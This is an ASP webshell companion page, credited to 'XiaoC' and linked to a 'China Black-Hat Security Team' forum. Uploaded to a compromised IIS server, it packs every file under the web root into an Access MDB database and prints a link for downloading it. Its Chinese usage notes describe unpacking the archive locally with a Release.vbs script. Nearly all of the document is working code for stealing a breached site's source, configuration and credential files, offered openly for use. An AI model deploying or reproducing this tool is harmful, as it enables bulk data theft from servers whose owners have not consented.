<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>XiaoC-[<%=Request.ServerVariables("LOCAL_ADDR")%>]文件打包ASP版本(2010年9月17日)</title>
</head>
<style type="text/css">
body{font-size:12px; color:#333333;font-family:Arial, Helvetica, sans-serif;}
a:link,a:hover,a:active,a:visited{text-decoration:none; color:#000}
input{border: 1px solid #cccccc; padding: 1px;}
.input{border-style: none;}
.mainbox{ margin:0 auto;width:960px; height:auto; border:solid 1px #91d70d;}
.header{ background-color:#91d70d; height:28px; color:#000;vertical-align:middle; font-weight:bold; }
.header #name{ float:left; text-indent:1.5em;width:480px; text-align:left; line-height:28px;vertical-align:middle;}
.header #author{float:right; width:400px; text-align:right;line-height:28px;vertical-align:middle; padding-right:15px;}
.mainbox .text{ margin-right:auto;margin-left:auto; margin-top:10px;margin-bottom:10px;width:500px; height:auto; border:solid 1px #91d70d;}
.mainbox .text #title{text-align:center;color:red;}
.mainbox .text #warn{text-align:center;color:red; font-weight:bold;}
.mainbox .text #tab{ text-indent:1.5em;line-height:28px; vertical-align:middle; text-align:center;}
.mainbox .bottom{background-color:#91d70d; line-height:28px; color:#000;vertical-align:middle; font-weight:bold; text-align:center}
</style>
<body>
	<div class="mainbox">
		<div class="header"><span id="name">Webshell文件打包-ASP版本[IP:<%=Request.ServerVariables("LOCAL_ADDR")%>]</span><span id="author">By XiaoC [<a href="http://81sec.com" title="Some Advice to XiaoC...">81sec.com</a>]</span>
        </div>
		<div class="text">
			<div id="title">-=使用说明=-[Know It,Then Hack It...]</div>
            <ol>
            	<li>backup.asp---打包程序</li>
                <li>Release.vbs---本地解压程序</li>
                <li>打包流程：配置文件→开始打包→下载mdb文件→本地Release.vbs解压</li>
                <li>解包说明：将打包的mdb文件与Release.vbs放在同一目录下即可</li>
            </ol>
            <div id="warn">打包程序运行期间请勿关闭浏览器，可能需要等待一段时间！打包结束有提示...</div>
            <%
				if request("action")<>"backup" then
			%>
			<div id="tab">
            <form action="?action=backup" method="post" name="backup">
             打包后文件名(.MDB)：<input type="text" name="mdbfile" value="xiaoc.mdb" style="height:15px" />&nbsp;&nbsp;<input type="submit" value="开始打包"  style="height:19px;"/>
            </form>
            </div>
            <%
				else
				response.Write("<ul>")
				filename=request.Form("mdbfile")
				dim dbfile,fso,sql
				' 你想要备份成的数据库名，可保持默认
				if filename<>"" then 
					mdbfile=filename
				response.Write("<li>您已经修改了默认打包文件名为"&filename&"...</li>")
				else
				mdbfile="xiaoc.mdb" 
				response.Write("<li>您保持默认打包文件名为xiaoC.mdb</li>")
				end if
				dbfile=server.MapPath(mdbfile)
				Set FSO = CreateObject("Scripting.FileSystemObject")
				'如果数据库存在就删除原有数据
				if fso.FileExists(dbfile) then
					fso.DeleteFile(dbfile)
					response.write("<li>发现已经存在该打包文件，已经删除并准备重建...</li>")
				end if
				set fso=nothing
				'开始建立数据库
				set cat=server.CreateObject("ADOX.Catalog")
				'建立access2000的数据库
				cat.Create "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & dbfile
				set cat=nothing
				if err.number=0 then
				Response.Write "<li>创建数据库 " & dbfile & " 成功</li>"
				else
				Response.Write "<li>数据库创建失败，原因： " & err.description&"</li>"
				Response.End
				end if
				Set Conn = Server.CreateObject("ADODB.Connection")
				'开始建表
				Conn.Open "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & dbfile
				'建立表
				sql="Create TABLE filedata([id] counter PRIMARY KEY,[path] Memo,[file] General)"
				conn.execute(sql)
				Set rs = CreateObject("ADODB.RecordSet")
				rs.Open "FileData", conn, 1, 3
				set obj=server.createobject("scripting.filesystemobject")
				'获得网站根目录
				set objfolder=obj.getfolder(server.mappath("/"))
				'开始查找文件
				search objfolder
				response.write("<li><font color=red>Over!打包完成，请下载"&filename&"即可，一般文件较大推荐迅雷下载！</font></li>")
				response.Write "<li style='text-align=center;'>下载链接：<a href=http://"& Request.ServerVariables("SERVER_NAME")&left(request.ServerVariables("PATH_INFO"),instrrev(request.ServerVariables("PATH_INFO"),"/"))&filename&" target=_blank>点击下载</a></li>"
				response.Write("</ul>")
				end if
			%>
		</div>
        <div class="bottom"><a href="http://www.bhst.org" target="_blank" title="中国黑帽安全小组论坛">China Black-Hat Security Team</a></div>
	</div>
</body>
</html>
<%
' 关键函数：文件遍历函数
function search(objfolder)
	dim objsubfolder
	for each objfile in objfolder.files
	Set objStream = Server.CreateObject("ADODB.Stream")
	a=a+1
	objStream.Type = 1
	objStream.Open
	response.write "<li>文件"&objfile.path&"正在打包...</li>"
	if right(objfile.path,len(mdbfile))=mdbfile or right(objfile.path,4)=".ldb" then
	' 防止打包本身的数据库和临时文件
	else
	objStream.LoadFromFile objfile.path
	rs.addnew
	rs("file")=objstream.read
	rs("Path")=right(objfile.path,len(objfile.path)-3)
	rs.update
	objStream.close
	end if
	next
	for each objsubfolder in objfolder.subfolders
	search objsubfolder  ' 递归搜索文件
	next
end Function
%>
